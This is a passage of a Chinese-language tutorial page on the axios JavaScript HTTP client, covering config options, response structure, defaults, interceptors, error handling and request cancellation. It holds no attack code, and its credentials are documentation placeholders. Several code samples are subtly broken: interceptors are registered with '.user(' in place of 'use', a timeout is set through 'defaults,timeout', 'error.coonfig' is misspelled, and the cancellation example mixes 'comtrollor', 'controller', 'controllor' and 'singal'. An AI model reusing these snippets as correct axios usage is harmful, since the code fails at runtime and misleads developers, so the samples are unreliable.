class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs json\"><span class=\"hljs-punctuation\">&#123;</span><br>    url<span class=\"hljs-punctuation\">:</span>&#x27;/api/user&#x27;<span class=\"hljs-punctuation\">,</span>          <span class=\"hljs-comment\">//用于请求的服务器URL</span><br>    method<span class=\"hljs-punctuation\">:</span>&#x27;get&#x27;<span class=\"hljs-punctuation\">,</span><br>    baseUrl<span class=\"hljs-punctuation\">:</span>&#x27;https<span class=\"hljs-punctuation\">:</span><span class=\"hljs-comment\">//192.168.0.1:35000&#x27;,\t\t//自动加在url前；</span><br>    transformRequest<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">[</span><br>        function(data<span class=\"hljs-punctuation\">,</span>headers)<span class=\"hljs-punctuation\">&#123;</span><br>            <span class=\"hljs-comment\">//对即将发送的data进行处理；</span><br>            return processedData;<br>        <span class=\"hljs-punctuation\">&#125;</span><br>    <span class=\"hljs-punctuation\">]</span><span class=\"hljs-punctuation\">,</span><br>    transformResponse<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">[</span><br>        function(response)<span class=\"hljs-punctuation\">&#123;</span><br>            <span class=\"hljs-comment\">//对收到的响应进行处理；</span><br>            return processedResponse;<br>        <span class=\"hljs-punctuation\">&#125;</span><br>    <span class=\"hljs-punctuation\">]</span><span class=\"hljs-punctuation\">,</span><br>    headers<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span>&#x27;X-Requested-With&#x27;<span class=\"hljs-punctuation\">:</span> &#x27;XMLHttpRequest&#x27;<span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br>    params<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><br>        ID<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">12345</span>\t\t<span class=\"hljs-comment\">//与请求一起发送的url参数；</span><br>    <span class=\"hljs-punctuation\">&#125;</span>，<br>    <span class=\"hljs-comment\">//data是作为请求体被发送的数据，仅适用于PUT，POST，DELETE和PATCH方法；</span><br>    <span class=\"hljs-comment\">// 在没有设置 `transformRequest` 时，则必须是以下类型之一:</span><br>  \t<span class=\"hljs-comment\">// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span><br>  \t<span class=\"hljs-comment\">// - 浏览器专属: FormData, File, Blob</span><br>  \t<span class=\"hljs-comment\">// - Node 专属: Stream, Buffer</span><br>    data<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><br>    firstname<span class=\"hljs-punctuation\">:</span>&#x27;Fred&#x27;<span class=\"hljs-punctuation\">,</span><br>\t<span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br>      <span class=\"hljs-comment\">// 发送请求体数据的可选语法</span><br>      <span class=\"hljs-comment\">// 请求方式 post</span><br>      <span class=\"hljs-comment\">// 只有 value 会被发送，key 则不会</span><br>      data<span class=\"hljs-punctuation\">:</span> &#x27;Country=Brasil&amp;City=Belo Horizonte&#x27;<span class=\"hljs-punctuation\">,</span><br><br>\t<span class=\"hljs-comment\">//timeout:指定请求超时的毫秒数；默认0ms；</span><br>\ttimeout<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1000</span><span class=\"hljs-punctuation\">,</span>  <br>\t<br>\t<span class=\"hljs-comment\">//跨域时是否需要凭证；</span><br>\twithCredentials<span class=\"hljs-punctuation\">:</span><span class=\"hljs-literal\"><span class=\"hljs-keyword\">false</span></span><span class=\"hljs-punctuation\">,</span><br>  <span class=\"hljs-comment\">// `adapter` 允许自定义处理请求，这使测试更加容易。</span><br>  <span class=\"hljs-comment\">// 返回一个 promise 并提供一个有效的响应 （参见 lib/adapters/README.md）。</span><br>  adapter<span class=\"hljs-punctuation\">:</span> function (config) <span class=\"hljs-punctuation\">&#123;</span><br>    <span class=\"hljs-comment\">/* ... */</span><br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `auth` HTTP Basic Auth</span><br>  auth<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">&#123;</span><br>    username<span class=\"hljs-punctuation\">:</span> &#x27;janedoe&#x27;<span class=\"hljs-punctuation\">,</span><br>    password<span class=\"hljs-punctuation\">:</span> &#x27;s00pers3cret&#x27;<br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `responseType` 表示浏览器将要响应的数据类型</span><br>  <span class=\"hljs-comment\">// 选项包括: &#x27;arraybuffer&#x27;, &#x27;document&#x27;, &#x27;json&#x27;, &#x27;text&#x27;, &#x27;stream&#x27;</span><br>  <span class=\"hljs-comment\">// 浏览器专属：&#x27;blob&#x27;</span><br>  responseType<span class=\"hljs-punctuation\">:</span> &#x27;json&#x27;<span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// 默认值</span><br><br>  <span class=\"hljs-comment\">// `responseEncoding` 表示用于解码响应的编码 (Node.js 专属)</span><br>  <span class=\"hljs-comment\">// 注意：忽略 `responseType` 的值为 &#x27;stream&#x27;，或者是客户端请求</span><br>  <span class=\"hljs-comment\">// Note: Ignored for `responseType` of &#x27;stream&#x27; or client-side requests</span><br>  responseEncoding<span class=\"hljs-punctuation\">:</span> &#x27;utf8&#x27;<span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// 默认值</span><br><br>  <span class=\"hljs-comment\">// `xsrfCookieName` 是 xsrf token 的值，被用作 cookie 的名称</span><br>  xsrfCookieName<span class=\"hljs-punctuation\">:</span> &#x27;XSRF-TOKEN&#x27;<span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// 默认值</span><br><br>  <span class=\"hljs-comment\">// `xsrfHeaderName` 是带有 xsrf token 值的http 请求头名称</span><br>  xsrfHeaderName<span class=\"hljs-punctuation\">:</span> &#x27;X-XSRF-TOKEN&#x27;<span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// 默认值</span><br><br>  <span class=\"hljs-comment\">// `onUploadProgress` 允许为上传处理进度事件</span><br>  <span class=\"hljs-comment\">// 浏览器专属</span><br>  onUploadProgress<span class=\"hljs-punctuation\">:</span> function (progressEvent) <span class=\"hljs-punctuation\">&#123;</span><br>    <span class=\"hljs-comment\">// 处理原生进度事件</span><br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `onDownloadProgress` 允许为下载处理进度事件</span><br>  <span class=\"hljs-comment\">// 浏览器专属</span><br>  onDownloadProgress<span class=\"hljs-punctuation\">:</span> function (progressEvent) <span class=\"hljs-punctuation\">&#123;</span><br>    <span class=\"hljs-comment\">// 处理原生进度事件</span><br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `maxContentLength` 定义了node.js中允许的HTTP响应内容的最大字节数</span><br>  maxContentLength<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-number\">2000</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `maxBodyLength`（仅Node）定义允许的http请求内容的最大字节数</span><br>  maxBodyLength<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-number\">2000</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `validateStatus` 定义了对于给定的 HTTP状态码是 resolve 还是 reject promise。</span><br>  <span class=\"hljs-comment\">// 如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，</span><br>  <span class=\"hljs-comment\">// 则promise 将会 resolved，否则是 rejected。</span><br>  validateStatus<span class=\"hljs-punctuation\">:</span> function (status) <span class=\"hljs-punctuation\">&#123;</span><br>    return status &gt;= <span class=\"hljs-number\">200</span> &amp;&amp; status &lt; <span class=\"hljs-number\">300</span>; <span class=\"hljs-comment\">// 默认值</span><br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `maxRedirects` 定义了在node.js中要遵循的最大重定向数。</span><br>  <span class=\"hljs-comment\">// 如果设置为0，则不会进行重定向</span><br>  maxRedirects<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-number\">5</span><span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// 默认值</span><br><br>  <span class=\"hljs-comment\">// `socketPath` 定义了在node.js中使用的UNIX套接字。</span><br>  <span class=\"hljs-comment\">// e.g. &#x27;/var/run/docker.sock&#x27; 发送请求到 docker 守护进程。</span><br>  <span class=\"hljs-comment\">// 只能指定 `socketPath` 或 `proxy` 。</span><br>  <span class=\"hljs-comment\">// 若都指定，这使用 `socketPath` 。</span><br>  socketPath<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-literal\"><span class=\"hljs-keyword\">null</span></span><span class=\"hljs-punctuation\">,</span> <span class=\"hljs-comment\">// default</span><br><br>  <span class=\"hljs-comment\">// `httpAgent` and `httpsAgent` define a custom agent to be used when performing http</span><br>  <span class=\"hljs-comment\">// and https requests, respectively, in node.js. This allows options to be added like</span><br>  <span class=\"hljs-comment\">// `keepAlive` that are not enabled by default.</span><br>  httpAgent<span class=\"hljs-punctuation\">:</span> new http.Agent(<span class=\"hljs-punctuation\">&#123;</span> keepAlive<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-literal\"><span class=\"hljs-keyword\">true</span></span> <span class=\"hljs-punctuation\">&#125;</span>)<span class=\"hljs-punctuation\">,</span><br>  httpsAgent<span class=\"hljs-punctuation\">:</span> new https.Agent(<span class=\"hljs-punctuation\">&#123;</span> keepAlive<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-literal\"><span class=\"hljs-keyword\">true</span></span> <span class=\"hljs-punctuation\">&#125;</span>)<span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `proxy` 定义了代理服务器的主机名，端口和协议。</span><br>  <span class=\"hljs-comment\">// 您可以使用常规的`http_proxy` 和 `https_proxy` 环境变量。</span><br>  <span class=\"hljs-comment\">// 使用 `false` 可以禁用代理功能，同时环境变量也会被忽略。</span><br>  <span class=\"hljs-comment\">// `auth`表示应使用HTTP Basic auth连接到代理，并且提供凭据。</span><br>  <span class=\"hljs-comment\">// 这将设置一个 `Proxy-Authorization` 请求头，它会覆盖 `headers` 中已存在的自定义 `Proxy-Authorization` 请求头。</span><br>  <span class=\"hljs-comment\">// 如果代理服务器使用 HTTPS，则必须设置 protocol 为`https`</span><br>  proxy<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">&#123;</span><br>    protocol<span class=\"hljs-punctuation\">:</span> &#x27;https&#x27;<span class=\"hljs-punctuation\">,</span><br>    host<span class=\"hljs-punctuation\">:</span> &#x27;<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>&#x27;<span class=\"hljs-punctuation\">,</span><br>    port<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-number\">9000</span><span class=\"hljs-punctuation\">,</span><br>    auth<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">&#123;</span><br>      username<span class=\"hljs-punctuation\">:</span> &#x27;mikeymike&#x27;<span class=\"hljs-punctuation\">,</span><br>      password<span class=\"hljs-punctuation\">:</span> &#x27;rapunz3l&#x27;<br>    <span class=\"hljs-punctuation\">&#125;</span><br>  <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// see https://axios-http.com/zh/docs/cancellation</span><br>  cancelToken<span class=\"hljs-punctuation\">:</span> new CancelToken(function (cancel) <span class=\"hljs-punctuation\">&#123;</span><br>  <span class=\"hljs-punctuation\">&#125;</span>)<span class=\"hljs-punctuation\">,</span><br><br>  <span class=\"hljs-comment\">// `decompress` indicates whether or not the response body should be decompressed </span><br>  <span class=\"hljs-comment\">// automatically. If set to `true` will also remove the &#x27;content-encoding&#x27; header </span><br>  <span class=\"hljs-comment\">// from the responses objects of all decompressed responses</span><br>  <span class=\"hljs-comment\">// - Node only (XHR cannot turn off decompression)</span><br>  decompress<span class=\"hljs-punctuation\">:</span> <span class=\"hljs-literal\"><span class=\"hljs-keyword\">true</span></span> <span class=\"hljs-comment\">// 默认值</span><br><span class=\"hljs-punctuation\">&#125;</span><br><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"5-响应结构\"><a href=\"#5-响应结构\" class=\"headerlink\" title=\"5.响应结构\"></a>5.响应结构</h4><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs json\"><span class=\"hljs-punctuation\">&#123;</span><br>\t<span class=\"hljs-comment\">//data为服务器响应</span><br>    data<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br>    <br>    <span class=\"hljs-comment\">//状态码</span><br>    status<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">200</span><span class=\"hljs-punctuation\">,</span><br>    <br>    <span class=\"hljs-comment\">//HTTP状态信息</span><br>    statusText<span class=\"hljs-punctuation\">:</span>&#x27;OK&#x27;<span class=\"hljs-punctuation\">,</span><br>    <br>    <span class=\"hljs-comment\">//服务器响应头</span><br>    headers<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br>    <span class=\"hljs-comment\">//axios请求的配置信息；</span><br>    config<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br>    <span class=\"hljs-comment\">//生成响应的请求</span><br>    <span class=\"hljs-comment\">// 在node.js中它是最后一个ClientRequest实例 (in redirects)，</span><br>  \t<span class=\"hljs-comment\">// 在浏览器中则是 XMLHttpRequest 实例</span><br>    request<span class=\"hljs-punctuation\">:</span><span class=\"hljs-punctuation\">&#123;</span><span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br><span class=\"hljs-punctuation\">&#125;</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"三、默认配置\"><a href=\"#三、默认配置\" class=\"headerlink\" title=\"三、默认配置\"></a>三、默认配置</h3><h4 id=\"1-全局axios默认值\"><a href=\"#1-全局axios默认值\" class=\"headerlink\" title=\"1.全局axios默认值\"></a>1.全局axios默认值</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-property\">defaults</span>.<span class=\"hljs-property\">baseURL</span> = <span class=\"hljs-string\">&#x27;https://api.example.com&#x27;</span>;<br>axios.<span class=\"hljs-property\">defaults</span>.<span class=\"hljs-property\">headers</span>.<span class=\"hljs-property\">common</span>[<span class=\"hljs-string\">&#x27;Authorization&#x27;</span>] = <span class=\"hljs-variable constant_\">AUTH_TOKEN</span>;<br>axios.<span class=\"hljs-property\">defaults</span>.<span class=\"hljs-property\">headers</span>.<span class=\"hljs-property\">post</span>[<span class=\"hljs-string\">&#x27;Content-Type&#x27;</span>] = <span class=\"hljs-string\">&#x27;application/x-www-form-urlencoded&#x27;</span>;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-自定义实例默认值\"><a href=\"#2-自定义实例默认值\" class=\"headerlink\" title=\"2.自定义实例默认值\"></a>2.自定义实例默认值</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// 创建实例时配置默认值</span><br><span class=\"hljs-keyword\">const</span> instance = axios.<span class=\"hljs-title function_\">create</span>(&#123;<br>  <span class=\"hljs-attr\">baseURL</span>: <span class=\"hljs-string\">&#x27;https://api.example.com&#x27;</span><br>&#125;);<br><br><span class=\"hljs-comment\">// 创建实例后修改默认值</span><br>instance.<span class=\"hljs-property\">defaults</span>.<span class=\"hljs-property\">headers</span>.<span class=\"hljs-property\">common</span>[<span class=\"hljs-string\">&#x27;Authorization&#x27;</span>] = <span class=\"hljs-variable constant_\">AUTH_TOKEN</span>;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-配置的优先级\"><a href=\"#3-配置的优先级\" class=\"headerlink\" title=\"3.配置的优先级\"></a>3.配置的优先级</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//此时默认超时时间为0</span><br><span class=\"hljs-keyword\">const</span> instance=axios.<span class=\"hljs-title function_\">create</span>();<br><br><span class=\"hljs-comment\">//重写库的超时默认值</span><br>instance.<span class=\"hljs-property\">defaults</span>,timeout=<span class=\"hljs-number\">2500</span>;<br><br><span class=\"hljs-comment\">//重写超时时间</span><br>instance.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/logout&#x27;</span>,&#123;<br>    <span class=\"hljs-attr\">timeout</span>:<span class=\"hljs-number\">5000</span><br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-拦截器\"><a href=\"#4-拦截器\" class=\"headerlink\" title=\"4.拦截器\"></a>4.拦截器</h4><p>请求或者响应被then或者catch处理之前拦截</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//添加请求拦截器</span><br>axios.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">request</span>.<span class=\"hljs-title function_\">user</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">config</span>)&#123;<br>    <span class=\"hljs-comment\">//发送请求前做点啥~</span><br>    <span class=\"hljs-keyword\">return</span> config;<br>&#125;,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">error</span>)&#123;<br>    <span class=\"hljs-comment\">//对发送中的错误做点啥~</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">reject</span>(error);<br>&#125;);<br><br><span class=\"hljs-comment\">//添加响应拦截器</span><br>axios.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">response</span>.<span class=\"hljs-title function_\">user</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>)&#123;<br>    <span class=\"hljs-comment\">//2xx范围内的状态码都会触发此函数哦~</span><br>    <span class=\"hljs-comment\">//do something.</span><br>    <span class=\"hljs-keyword\">return</span> response;<br>&#125;,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">error</span>)&#123;<br>    <span class=\"hljs-comment\">//2xx以外的状态码都会触发此函数哦~</span><br>    <span class=\"hljs-comment\">//do something.</span><br>    <span class=\"hljs-keyword\">return</span> error;<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"移除拦截器\"><a href=\"#移除拦截器\" class=\"headerlink\" title=\"移除拦截器\"></a>移除拦截器</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> interceptor=axios.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">request</span>.<span class=\"hljs-title function_\">user</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br><br>&#125;);<br>axios.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">request</span>.<span class=\"hljs-title function_\">eject</span>(interceptor);<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"添加拦截器\"><a href=\"#添加拦截器\" class=\"headerlink\" title=\"添加拦截器\"></a>添加拦截器</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> instance = axios.<span class=\"hljs-title function_\">create</span>();<br>instance.<span class=\"hljs-property\">interceptors</span>.<span class=\"hljs-property\">request</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;<span class=\"hljs-comment\">/*...*/</span>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"5-错误处理\"><a href=\"#5-错误处理\" class=\"headerlink\" title=\"5.错误处理\"></a>5.错误处理</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user/12345&#x27;</span>).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">error</span>)&#123;<br>    <span class=\"hljs-keyword\">if</span>(error.<span class=\"hljs-property\">response</span>)&#123;<br>        <span class=\"hljs-comment\">//请求成功发出且服务器响应了状态码，但是状态码超出了2xx</span><br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error.<span class=\"hljs-property\">response</span>.<span class=\"hljs-property\">data</span>);<br>    &#125;<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(error.<span class=\"hljs-property\">request</span>)&#123;<br>        <span class=\"hljs-comment\">//请求已经发起成功，但是没有收到响应；</span><br>        <span class=\"hljs-comment\">//error.request是浏览器中XMLHttpRequest的实例；</span><br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error.<span class=\"hljs-property\">request</span>);<br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-comment\">//请求发出时出问题</span><br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;Error:&#x27;</span>,error.<span class=\"hljs-property\">message</span>);<br>    &#125;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error.<span class=\"hljs-property\">coonfig</span>);<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"使用validataStatus配置选项，可以自定义抛出错误HttpCode\"><a href=\"#使用validataStatus配置选项，可以自定义抛出错误HttpCode\" class=\"headerlink\" title=\"使用validataStatus配置选项，可以自定义抛出错误HttpCode;\"></a>使用validataStatus配置选项，可以自定义抛出错误HttpCode;</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user/12345&#x27;</span>,&#123;<br>    <span class=\"hljs-attr\">validateStatus</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">status</span>)&#123;<br>        <span class=\"hljs-keyword\">return</span> status&gt;<span class=\"hljs-number\">500</span>;<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"使用-toJSON-可以获取更多关于HTTP错误的信息。\"><a href=\"#使用-toJSON-可以获取更多关于HTTP错误的信息。\" class=\"headerlink\" title=\"使用 toJSON 可以获取更多关于HTTP错误的信息。\"></a>使用 <code>toJSON</code> 可以获取更多关于HTTP错误的信息。</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user/12345&#x27;</span>)<br>  .<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">error</span>) &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error.<span class=\"hljs-title function_\">toJSON</span>());<br>  &#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"6-取消请求\"><a href=\"#6-取消请求\" class=\"headerlink\" title=\"6.取消请求\"></a>6.取消请求</h4><h5 id=\"fetechAPI-AbortController取消请求\"><a href=\"#fetechAPI-AbortController取消请求\" class=\"headerlink\" title=\"fetechAPI  AbortController取消请求\"></a>fetechAPI  AbortController取消请求</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> comtrollor=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">AbortController</span>();<br><br>axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/foo/bar&#x27;</span>,&#123;<br>    <span class=\"hljs-attr\">signal</span>:controller.<span class=\"hljs-property\">singal</span><br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>)&#123;<br>    <br>&#125;);<br><br>controllor.<span class=\"hljs-title function_\">abort</span>();<br></code></pre></td></tr></table></figure>\n\n<h5 